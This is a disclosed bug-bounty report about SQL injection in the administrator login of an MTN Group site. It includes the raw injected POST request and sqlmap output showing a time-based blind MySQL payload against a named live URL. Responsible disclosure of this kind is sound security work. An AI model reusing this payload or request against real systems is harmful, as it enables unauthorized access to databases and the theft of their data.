# SQL Injection on the administrator panel

## Report Details
- **Report ID**: 865436
- **URL**: https://hackerone.com/reports/865436
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-03T20:47:46.027Z
- **Disclosed**: 2021-07-29T03:50:17.043Z

## Reporter
- **Username**: z3lox
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
Hello team. The admin panel of the website is mtngbissau.com or is vulnerable to sql attack via https://mtngbissau.com/webadmin/index.php

## Request 

```
POST /webadmin/index.php HTTP/1.1
Host: mtngbissau.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://mtngbissau.com/webadmin/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close
Cookie: PHPSESSID=74db1535be320f591b6106253ad77191; SERVERID68971=262072|Xq8Kv|Xq8Ip
Upgrade-Insecure-Requests: 1

login=user'&pass=uesse
```
Confirmation of the vulnerability with sqlmap

```
[*] starting @ 21:06:44 /2020-05-03/

[18:05:44] [INFO] parsing HTTP request from 'post'
[18:06:10] [INFO] resuming back-end DBMS 'mysql' 
[18:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin
---
[18:06:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:06:45] [INFO] fetched data logged to text files under '/home/kira/.sqlmap/output/mtngbissau.com'


```

## Impact

Web application is vulnerable to SQL injection, allowing access to data

## Attachments
- SQLi.png
